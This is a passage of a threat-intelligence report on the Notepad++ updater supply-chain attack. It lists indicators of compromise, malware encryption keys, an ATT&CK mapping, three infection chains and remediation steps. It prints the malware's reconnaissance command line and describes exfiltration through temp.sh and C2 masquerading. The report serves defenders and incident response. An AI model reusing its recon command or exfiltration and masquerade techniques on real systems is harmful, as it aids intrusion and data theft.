%appdata%\ProShow\ProShow.exe
%appdata%\Adobe\Scripts\alien.ini
%appdata%\Adobe\Scripts\alien.dll
%appdata%\Adobe\Scripts\script.exe
%appdata%\Adobe\Scripts\lua5.1.dll
%appdata%\Bluetooth\BluetoothService
%appdata%\Bluetooth\BluetoothService.exe
%appdata%\Bluetooth\log.dll
```

### Cryptographic Artefacts
```
RC4 key (Chrysalis config): qwhvb^435h&*7
XOR key (Chrysalis main module): gQ2JR&9;
XOR key (Cobalt Strike Beacon configs): CRAZY
LCG constants (log.dll decryptor): 0x19660D, 0x3C6EF35F
API hash algorithm (log.dll): FNV-1a + MurmurHash avalanche finaliser
```


## MITRE ATT&CK Mapping

| Tactic | ID | Technique | How Used |
|---|---|---|---|
| Initial Access | T1195.002 | Compromise Software Supply Chain | Hosting provider compromise → malicious Notepad++ update delivery |
| Execution | T1059.003 | Windows Command Shell | Recon via `cmd /c whoami&&tasklist&&systeminfo&&netstat -ano` |
| Execution | T1059.007 | JavaScript / Lua | Compiled Lua script (`alien.ini`) used to allocate and execute shellcode (Chain 2) |
| Execution | T1203 | Exploitation for Client Execution | ProShow vulnerability exploited to trigger shellcode in `load` file (Chain 1) |
| Execution | T1106 | Native API | `EnumWindowStationsW` used as shellcode execution primitive in Chain 2 |
| Persistence | T1543.003 | Create or Modify System Process: Windows Service | Chrysalis primary persistence via service creation |
| Persistence | T1547.001 | Boot or Logon Autostart: Registry Run Keys | Chrysalis fallback persistence |
| Defence Evasion | T1574.002 | Hijack Execution Flow: DLL Side-Loading | `BluetoothService.exe` (Bitdefender) sideloads malicious `log.dll` (Chain 3) |
| Defence Evasion | T1027 | Obfuscated Files or Information | API hashing (FNV-1a + MurmurHash), LCG decryption, runtime string construction |
| Defence Evasion | T1036 | Masquerading | DeepSeek API URL format for Chrysalis C2; `Bluetooth` directory and process naming; CDN/DNS-resembling C2 domains |
| Defence Evasion | T1027.002 | Software Packing | RC4 + compound XOR encryption across Chrysalis payload stages |
| Discovery | T1057 | Process Discovery | `tasklist` in all recon heartbeats |
| Discovery | T1082 | System Information Discovery | `systeminfo` in Chain 2 recon |
| Discovery | T1049 | System Network Connections Discovery | `netstat -ano` in Chain 2 recon |
| Discovery | T1033 | System Owner / User Discovery | `whoami` in all recon heartbeats |
| Collection | T1119 | Automated Collection | Recon data staged in text file, uploaded to `temp.sh` |
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | Cobalt Strike and Chrysalis C2 over HTTPS |
| Command and Control | T1102 | Web Service | `temp.sh` used as LOLC2 relay for victim recon data exfiltration |
| Command and Control | T1001.003 | Data Obfuscation: Protocol Impersonation | Chrysalis C2 URL structured to mimic DeepSeek API endpoints |


## Attack Flow

```
[Hosting Provider Breach — June 2025]
          │
          ▼
[Update traffic redirected at infrastructure level]
          │
          ▼
[Victim triggers Notepad++ update]
          │
          ▼
[GUP.exe requests update URL from notepad-plus-plus.org]
          │
          ▼
[Response redirected → attacker-controlled URL returned]
          │
          ▼
[GUP.exe downloads malicious update.exe (NSIS installer)]
          │
          ├── Chain 1 ──► Recon heartbeat (temp.sh LOLC2)
          │                    └──► ProShow exploit → Metasploit loader → Cobalt Strike Beacon
          │                                                                 └──► cdncheck.it[.]com C2
          │
          ├── Chain 2 ──► Expanded recon heartbeat (temp.sh LOLC2)
          │                    └──► Lua interpreter → EnumWindowStationsW shellcode exec
          │                                            └──► Metasploit loader → Cobalt Strike Beacon
          │                                                                       └──► safe-dns.it[.]com C2
          │
          └── Chain 3 ──► DLL sideload (BluetoothService.exe + log.dll)
                               └──► LCG decrypt → RC4 decrypt → Chrysalis backdoor
                                                                   └──► api.skycloudcenter[.]com C2
                                                                          (DeepSeek URL masquerade)
```


## Remediation

### For Individual Users

| Action               | Detail                                                                                                                             |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| Update Notepad++     | Download v8.9.1 or later from `notepad-plus-plus.org` directly - do not use the auto-updater on affected versions                  |
| Disable auto-updater | Uncheck auto-updater during v8.9.1 installation if preferred, or install with `msiexec /i npp.8.9.1.Installer.x64.msi NOUPDATER=1` |
| Check for IoCs       | Review file paths and network indicators listed above against local system artefacts                                               |

### For Enterprise

| Priority | Action                                                                                                                                              |
| -------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| **P0**   | Block all IoC network indicators at firewall/proxy                                                                                                  |
| **P0**   | Check for malicious file paths across estate: `%appdata%\ProShow\load`, `%appdata%\Adobe\Scripts\alien.ini`, `%appdata%\Bluetooth\BluetoothService` |
| **P0**   | Hunt for `GUP.exe` process tree anomalies in EDR telemetry, retrospective from September 2025                                                       |
| **P1**   | Deploy Notepad++ v8.9.1 MSI with `NOUPDATER=1` flag or manage updates via internal software distribution                                            |
| **P1**   | Enable Windows Event IDs 4688 (with command-line logging), 5136, 4663 if not already active                                                         |
| **P1**   | Add Sigma/SIEM rules for `temp.sh` DNS resolution and User-Agent-embedded `temp.sh` URLs                                                            |
| **P2**   | Review all third-party software update mechanisms for equivalent CWE-494 exposure - this pattern applies broadly                                    |

### Patch Tracking

| Version | Protection Level                                                                                      |
| ------- | ----------------------------------------------------------------------------------------------------- |
| < 8.8.9 | Fully vulnerable - no update integrity verification                                                   |
| 8.8.9   | Partial fix - installer certificate and signature verification added                                  |
| 8.9.1   | Recommended minimum - includes all relevant security enhancements                                     |
| 8.9.2+  | Full fix - signed XML manifest enforcement active; signature verification enforced on update metadata |


## Analysis Tools & Resources Used

**Primary Sources:**
- Notepad++ official incident statements (`notepad-plus-plus.org/news/`)
- Kaspersky GReAT : *The Notepad++ supply chain attack - unnoticed execution chains and new IoCs* (Securelist, February 3, 2026)
- Rapid7 : *The Chrysalis Backdoor: A Deep Dive into Lotus Blossom's toolkit* (rapid7.com, February 2, 2026)
- CISA KEV Catalog - CVE-2025-15556 entry
- NVD - CVE-2025-15556 detail page

**Threat Intelligence:**
- Kaspersky OpenTIP (hash lookups for all IoCs)
- MITRE ATT&CK (technique mapping)
- OSV.dev - CVE-2025-15556 structured data

**Verification:**
- WinGUp commit `ce0037549995ed0396cc363544d14b3425614fdb` (GitHub) - fix implementation
- Notepad++ commit `bcf2aa68ef414338d717e20e059459570ed6c5ab` (GitHub) - associated code change


## References

```
https://notepad-plus-plus.org/news/hijacked-incident-info-update/
https://notepad-plus-plus.org/news/clarification-security-incident/
https://notepad-plus-plus.org/news/v889-released/
https://securelist.com/notepad-supply-chain-attack/118708/
https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/
https://nvd.nist.gov/vuln/detail/CVE-2025-15556
https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-15556
https://www.vulncheck.com/advisories/notepad-plus-plus-wingup-updater-lacks-update-integrity-verification
https://community.notepad-plus-plus.org/topic/27298/notepad-v8-8-9-vulnerability-fix
https://github.com/notepad-plus-plus/wingup/commit/ce0037549995ed0396cc363544d14b3425614fdb
https://github.com/notepad-plus-plus/notepad-plus-plus/commit/bcf2aa68ef414338d717e20e059459570ed6c5ab
https://cve.org/CVERecord?id=CVE-2025-15556
https://osv.dev/vulnerability/CVE-2025-15556
```


## Additional Notes

The hosting provider's statement confirmed that the attacker "specifically searched for the notepad-plus-plus.org domain with the goal to intercept the traffic." This indicates the attackers identified the CVE-494 exposure in WinGUp prior to compromising the hosting infrastructure and selected Notepad++ as an attack vector deliberately - not opportunistically.

The gap between Chain 1 (August) and Chain 2 (mid-September) coincides almost exactly with the hosting provider's maintenance window that terminated direct server access (September 2). The attackers retooled their chain during the period when they were operating on retained credentials only, rather than direct server access - suggesting operational awareness of their own access level.

The Kaspersky SIEM package (**[OOTB] Notepad++ supply chain attack package – ENG**) is available in the Kaspersky SIEM repository and is the recommended starting point for retrospective threat hunting. Recommended analysis window: September 2025 onwards.

No public IoCs were available directly from the Notepad++ IR team - 400 GB of server logs were reviewed but yielded no concrete binary hashes, domains, or IP addresses. All published IoCs originate from Kaspersky and Rapid7 endpoint telemetry, not server-side investigation.




